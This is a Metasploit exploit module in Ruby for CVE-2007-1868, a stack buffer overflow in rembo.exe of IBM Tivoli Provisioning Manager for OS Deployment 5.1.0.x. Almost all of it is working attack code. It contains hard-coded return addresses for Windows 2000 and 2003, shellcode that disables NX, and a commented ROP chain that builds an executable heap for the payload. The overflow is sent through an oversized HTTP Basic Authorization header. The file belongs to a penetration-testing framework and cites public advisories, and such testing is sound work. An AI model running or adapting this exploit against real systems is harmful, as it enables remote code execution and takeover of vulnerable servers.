##
# $Id: ibm_tpmfosd_overflow.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IBM TPM for OS Deployment 5.1.0.x rembo.exe Buffer Overflow',
			'Description'    => %q{
					This is a stack buffer overflow exploit for IBM Tivoli Provisioning Manager
				for OS Deployment version 5.1.0.X.
			},
			'Author'         => 'toto',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2007-1868'],
					[ 'OSVDB', '34678'],
					[ 'BID', '23264'],
					[ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-07-05' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 0x200,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a",
					'Prepend' =>
							# Disable NX on 2k3 to upload data on the stack
							# (service crashes if the stack is switched to the heap)
							"\x64\x8b\x0d\x30\x00\x00\x00"              + # mov ecx, dword ptr fs:[0x30] ; PEB
							"\x83\xb9\xa4\x00\x00\x00\x05"              + # cmp dword ptr [ecx+0xa4], 5  ; MajorVersion == 5
							"\x75\x30"                                  + # jnz after
							"\x83\xb9\xa8\x00\x00\x00\x02"              + # cmp dword ptr [ecx+0xa8], 2  ; MinorVersion == 2
							"\x75\x27"                                  + # jnz after
							"\x81\xb9\xac\x00\x00\x00\xce\x0e\x00\x00"  + # cmp dword ptr [ecx+0xac], 0xece  ; BuildVersion (> SP0)
							"\x76\x1b"                                  + # jbe after
							"\x8d\x89\xa8\x00\x00\x00"                  + # lea ecx, [ecx+0xa8]
							"\xba\x00\x03\xfe\x7f"                      + # mov edx, 0x7ffe0300
							"\xb8\xed\x00\x00\x00"                      + # mov eax, 0xed
							"\x6a\x04"                                  + # push 4
							"\x51"                                      + # push ecx
							"\x6a\x22"                                  + # push 22
							"\x6a\xff"                                  + # push -1
							"\x6a\xff"                                  + # push -1 (padding)
							"\xff\x12",                                   # call dword ptr[edx]
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['TPMfOSD 5.1 (Windows 2000 SP4 - English)', { 'Rets' => [0x77bb53af, 0x77bb06f0, 0x75022ac5] }],
					# tested against 5.1.0.1 and 5.1.0.2 (use ATL.Dll)
					['TPMfOSD 5.1 (Windows 2003 All - English)', { 'IB' => 0x76a80000, 'Data' => 0x01061980 }],
				],
			'DisclosureDate' => 'May 02 2007',
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(443),
				OptBool.new('SSL', [true, 'Use SSL', true]),
			], self.class )
	end

	def exploit

		if target.name =~ /2003/
			# the exploit allocates and executable heap to copy and execute the payload

			auth = Rex::Text.rand_text_alphanumeric(2800)

			ib = target['IB']

			auth[ 2080, 4 ] = [ ib + 0x11010 ].pack('V')  # store a data to prevent a crash

			# ret 1:
			# 76a81a5f:
			# pop esi  <- 0x76a91010
			# pop ebx  <- 0x76a91010
			# pop ebp  <- 0x76a91010
			# retn

			auth[ 2096, 4 ] = [ ib + 0x1a5f ].pack('V')
			auth[ 2100, 4 ] = [ target['Data'] ].pack('V')
			auth[ 2104, 4 ] = [ ib + 0x11010 ].pack('V')
			auth[ 2108, 4 ] = [ ib + 0x11010 ].pack('V')

			# ret 2:
			# 76a817f0:
			# pop esi   <- 0x76a81512 (ocscpy pointer)
			# retn

			auth[ 2112, 4 ] = [ ib + 0x17f0 ].pack('V')
			auth[ 2116, 4 ] = [ ib + 0x1512 ].pack('V')

			# ret 3: (copy the payload in atl.dll data)
			# 76a811c8
			# lea eax, [esp+3c]   <-- eax points to the payload
			# push eax       <- payload
			# push ebp       <- 0x76a91010
			# call esi       <- ocscpy
			# cmp eax, ebx   <- eax == ebx = 0x76a91010
			# jnz before     <- jump not taken
			# mov eax, ebp
			# pop edi
			# pop esi
			# pop ebp
			# pop ebx
			# add esp, 1ch
			# retn

			auth[ 2120, 4 ] = [ ib + 0x11c8 ].pack('V')


			# ret 4:  (increase the stack pointer to allow a jump back in the payload)
			# add esp, 1ch
			# retn

			auth[ 2160, 4 ] = [ ib + 0x11da ].pack('V')
			auth[ 2184, 2 ] = "\xeb\x56"    # jmp payload


			# ret 5: (create an executable heap - huge one)
			# 76a8c0c4
			# jmp ds:__imp_HeapCreate  (0xffffffff, 0x01010101, 0x01010101)

			auth[ 2196, 4 ] = [ ib + 0xc0c4 ].pack('V')

			# ret 6:
			# 76a817f0
			# pop esi  <- 0x76a92a38 (hHeap)
			# retn

			auth[ 2204, 4 ] = [ ib + 0x17f0 ].pack('V')
			auth[ 2208, 4 ] = [ 0xffffffff ].pack('V')
			auth[ 2212, 4 ] = [ 0x01010101 ].pack('V')
			auth[ 2216, 4 ] = [ 0x01010101 ].pack('V')
			auth[ 2220, 4 ] = [ ib + 0x12a38 ].pack('V')

			# ret 7:
			# 76a8190a
			# mov [esi], eax   <- store new heap in hHeap
			# mov eax, esi
			# pop esi
			# retn 4

			auth[ 2224, 4 ] = [ ib + 0x190a ].pack('V')

			# ret 8 (_calloc - needed to allocate a small buffer to prevent a no mem exception):
			# 76a88a29
			# mov eax, [esp+arg_0]  <- 0x7fffffa0
			# imul eax, [esp+arg_4] <- eax * 0x7fffffa0 = 0x2400
			# push eax
			# call _malloc
			# pop ecx    <- ecx = 0x2400
			# retn

			auth[ 2232, 4 ] = [ ib + 0x8a29 ].pack('V')

			# ret 9:
			# 76a8c9ab
			# add esp, 0ch
			# retn 4

			auth[ 2240, 4 ] = [ ib + 0xc9ab ].pack('V')
			auth[ 2244, 4 ] = [ 0x7fffffa0 ].pack('V')
			auth[ 2248, 4 ] = [ 0x7fffffa0 ].pack('V')

			# ret 10 (copy payload into heap):
			# 76a8c9a0
			# push ecx   <- 0x2400
			# push [esp+8]  <- 0x76a91010   (payload in atl.dll data)
			# push eax    <- heap pointer
			# call _memcpy
			# add esp, 0ch
			# retn

			auth[ 2256, 4 ] = [ ib + 0xc9a0 ].pack('V')

			# ret 11 (jump into heap)
			# 76a815e7
			# call eax

			auth[ 2264, 4 ] = [ ib + 0x15e7 ].pack('V')
			auth[ 2268, 4 ] = [ ib + 0x11010 ].pack('V')

			auth[ 2272, payload.encoded.length ] = payload.encoded

		else
			auth = Rex::Text.rand_text_alphanumeric(2800)

			auth[ 2080, 4 ] = [ target['Rets'][1] ].pack('V')
			auth[ 2096, 4 ] = [ target['Rets'][2] ].pack('V')  # pop, ret
			auth[ 2100, 4 ] = [ target['Rets'][1] ].pack('V')
			auth[ 2104, 4 ] = [ target['Rets'][0] ].pack('V')  # jmp esp
			auth[ 2108, payload.encoded.length ] = payload.encoded

		end

		print_status("Trying target #{target.name}...")

		res = send_request_cgi({
			'uri'          => '/',
			'method'       => 'GET',
			'headers'      =>
			{
				'Authorization' => "Basic #{auth}"
			}
		}, 5)

		handler
	end

end